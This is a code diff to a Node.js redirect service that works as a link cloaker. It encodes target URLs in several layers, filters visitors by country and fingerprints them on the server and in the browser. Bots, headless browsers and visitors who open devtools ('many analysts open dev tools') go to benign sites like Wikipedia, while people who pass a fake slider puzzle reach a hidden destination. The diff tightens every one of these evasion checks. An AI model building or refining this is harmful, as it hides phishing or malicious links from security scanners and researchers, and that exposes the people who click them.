@@ -10,7 +10,7 @@ const app = express();
 app.set('trust proxy', 1);
 
 // ────────────────────────────────────────────────
-// CONFIG
+// CONFIGURATION
 // ────────────────────────────────────────────────
 const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';
 
@@ -19,7 +19,8 @@ const BOT_URLS = [
   'https://www.apple.com',
   'https://en.wikipedia.org/wiki/Main_Page',
   'https://www.google.com',
-  'https://www.bbc.com'
+  'https://www.bbc.com',
+  'https://www.youtube.com'
 ];
 
 const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
@@ -30,7 +31,7 @@ const LOG_FILE = 'clicks.log';
 const PORT = process.env.PORT || 3000;
 
 // ────────────────────────────────────────────────
-// CSP
+// CSP – strict, no external resources
 // ────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
@@ -41,11 +42,11 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
-      styleSrc: ["'self'", "'unsafe-inline'"],
-      imgSrc: ["'self'", 'data:'],
+      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      styleSrc:   ["'self'", "'unsafe-inline'"],
+      imgSrc:     ["'self'", 'data:'],
       connectSrc: ["'self'"],
-      frameSrc: ["'self'"],
+      frameSrc:   ["'self'"],
     },
   },
 }));
@@ -53,11 +54,11 @@ app.use(helmet({
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Health checks
+// Health endpoints
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
 // ────────────────────────────────────────────────
-// BOT DETECTION & RATE LIMIT – ENHANCED
+// BOT DETECTION – VERY STRONG (server-side)
 // ────────────────────────────────────────────────
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
@@ -80,41 +81,38 @@ function isLikelyBot(req) {
 
   let score = 0;
 
-  // Existing checks
-  if (suspiciousUA.some(r => r.test(ua))) score += 30;
-  if (!ua.includes('mozilla')) score += 15;
-  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 12;
-  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 10;
-  if (!accept.includes('text/html')) score += 10;
-  if (!req.headers['sec-fetch-site'] || !req.headers['sec-fetch-mode']) score += 20;
-  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 4) score += 14;
+  // Basic UA & header signals
+  if (suspiciousUA.some(r => r.test(ua))) score += 35;
+  if (!ua.includes('mozilla')) score += 18;
+  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 15;
+  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 12;
+  if (!accept.includes('text/html')) score += 12;
 
-  // ─── New server-side checks ───
-  // Missing modern client hints
+  // Missing modern browser security headers (very common in bots 2025–2026)
   if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) {
-    score += 18;
+    score += 22;
   }
-  // Missing Upgrade-Insecure-Requests (real browsers usually send it)
-  if (!req.headers['upgrade-insecure-requests']) {
-    score += 12;
+  if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) {
+    score += 25;
   }
-  // Alphabetically sorted headers (some bots sort them)
+  if (!req.headers['upgrade-insecure-requests']) score += 14;
+
+  // Suspicious header patterns
+  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 16;
+  if (Object.keys(req.headers).length < 10) score += 18;
+
+  // Alphabetical header sorting (many simple bots sort headers)
   const headerKeys = Object.keys(req.headers);
   const sortedKeys = [...headerKeys].sort();
-  if (headerKeys.join() === sortedKeys.join()) {
-    score += 16;
-  }
-  // Very minimal header set (real browsers send 15–25+ headers)
-  if (headerKeys.length < 10) {
-    score += 15;
-  }
+  if (headerKeys.join() === sortedKeys.join()) score += 20;
 
-  console.log(`[BOT CHECK] ${req.ip} | Score: ${score} | UA: ${ua.substring(0,80)}`);
-  return score >= 50; // raised threshold slightly due to new signals
+  console.log(`[BOT CHECK SERVER] ${req.ip} | Score: ${score} | UA: ${ua.substring(0,80)}...`);
+
+  return score >= 65;
 }
 
 // ────────────────────────────────────────────────
-// GEO CHECK
+// GEO LOCATION CHECK
 // ────────────────────────────────────────────────
 async function getCountryCode(req) {
   if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();
@@ -132,7 +130,7 @@ async function getCountryCode(req) {
 }
 
 // ────────────────────────────────────────────────
-// MULTI-LAYER ENCODING / DECODING
+// MULTI-LAYER URL ENCODING / DECODING
 // ────────────────────────────────────────────────
 const encoders = [
   { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
@@ -183,7 +181,7 @@ function multiLayerDecode(encoded, layers, noise) {
 }
 
 // ────────────────────────────────────────────────
-// GENERATE LINK
+// GENERATE TRACKING LINK
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -214,7 +212,7 @@ app.get('/generate', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// MAIN ROUTE /r/*  – NEUTRAL + STRONGER BOT DETECTION
+// MAIN ROUTE /r/*  – NEUTRAL PAGE + VERY STRONG BOT DETECTION
 // ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
@@ -234,7 +232,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});
 
-  // Decode target
+  // Decode target URL from query params
   let redirectTarget = TARGET_URL;
   try {
     const query = req.url.split('?')[1] || '';
@@ -263,7 +261,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
 
   // ────────────────────────────────────────────────
-  // NEUTRAL VERIFICATION PAGE + STRONG CLIENT-SIDE BOT DETECTION
+  // NEUTRAL VERIFICATION PAGE + AGGRESSIVE CLIENT-SIDE BOT DETECTION
   // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
@@ -395,8 +393,9 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     const TARGET_URL = '${safeTarget}';
     const BOT_URL    = '${BOT_URLS[0]}';
 
-    // ─── STRONG CLIENT-SIDE BOT DETECTION ───
-    // 1. Classic headless & automation flags
+    // ─── VERY STRONG CLIENT-SIDE BOT / HEADLESS / AUTOMATION DETECTION ───
+
+    // 1. Classic headless & automation fingerprints
     if (
       navigator.webdriver ||
       window.outerWidth === 0 ||
@@ -405,17 +404,19 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       navigator.languages.length === 0 ||
       navigator.hardwareConcurrency === undefined ||
       navigator.deviceMemory === undefined ||
-      !navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')
+      !navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari') ||
+      (navigator.userAgentData && !navigator.userAgentData.platform) ||
+      navigator.maxTouchPoints === undefined
     ) {
       location.href = BOT_URL;
     }
 
-    // 2. Missing or incomplete chrome object (common in headless Chrome)
-    if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes) {
+    // 2. Incomplete or missing Chrome object (very common in headless Chrome 2025–2026)
+    if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes || !window.chrome.csi) {
       location.href = BOT_URL;
     }
 
-    // 3. Canvas fingerprint check against known bot patterns
+    // 3. Canvas fingerprint – detect known bot / headless signatures
     const testCanvas = document.createElement('canvas');
     const ctx = testCanvas.getContext('2d');
     ctx.textBaseline = 'top';
@@ -429,47 +430,47 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     const canvasData = testCanvas.toDataURL();
 
-    // Known bot / headless canvas fingerprints (partial list – update as needed)
+    // Known bot / headless canvas patterns (partial – expand during testing)
     const botCanvasPatterns = [
-      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51', // puppeteer-like
-      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAHgwJ/lK3Q6wAAAABJRU5ErkJggg==', // minimal/empty
-      'AAAAAElFTkSuQmCC' // very short / suspicious
+      'iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51',
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ',
+      'AAAAAElFTkSuQmCC'
     ];
 
     if (botCanvasPatterns.some(p => canvasData.includes(p))) {
       location.href = BOT_URL;
     }
 
-    // 4. DevTools / console open detection
-    const devtoolsCheck = /./;
-    devtoolsCheck.toString = function() {
-      entropy -= 30; // heavy penalty
+    // 4. DevTools / inspector detection (many analysts open dev tools)
+    const devtoolsTrap = /./;
+    devtoolsTrap.toString = function() {
+      entropy -= 40; // heavy penalty
       return 'devtools detected';
     };
-    console.log('%c', devtoolsCheck);
+    console.log('%c', devtoolsTrap);
 
-    // 5. Very fast or linear mouse movement detection
+    // 5. Unrealistically fast or perfectly linear mouse/touch movement
     let lastMoveTime = 0;
     document.addEventListener('mousemove', e => {
       const now = Date.now();
-      if (now - lastMoveTime < 6) { // unrealistically fast
-        entropy -= 12;
+      if (now - lastMoveTime < 5) { // too fast for human
+        entropy -= 15;
       }
       lastMoveTime = now;
     }, {passive: true});
 
-    // ─── Behavioral tracking (existing + tightened) ───
+    // ─── Behavioral tracking (tightened for better human vs bot separation) ───
     let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
     let focusLost = 0;
 
     const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const minMoves   = mobile ? 6 : 8;
-    const minEntropy = mobile ? 16 : 26;
+    const minMoves   = mobile ? 6 : 9;
+    const minEntropy = mobile ? 18 : 30;
 
     function updateEntropy(dx, dy) {
       const now = Date.now();
       const dt = (now - lastTime) / 1000 || 1;
-      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.6;
+      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.8;
       lastTime = now;
       moves++;
     }
@@ -491,7 +492,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       if (document.hidden) focusLost++;
     });
 
-    // ─── Neutral puzzle ───
+    // ─── Neutral puzzle logic ───
     const bg = document.getElementById('bgCanvas').getContext('2d');
     const piece = document.getElementById('pieceCanvas').getContext('2d');
     const knob = document.getElementById('slider-knob');
@@ -563,12 +564,14 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       }
     }
 
+    // Show puzzle after fake human-like delay
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('content').style.display = 'block';
       generatePuzzle();
     }, 2200 + Math.random() * 1800);
 
+    // Hard timeout – fail if user takes too long
     setTimeout(() => location.href = BOT_URL, 45000);
   </script>
 </body>
@@ -576,7 +579,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   `);
 });
 
-// Catch-all redirect
+// Catch-all – redirect to random benign page
 app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
 
 app.listen(PORT, '0.0.0.0', () => {
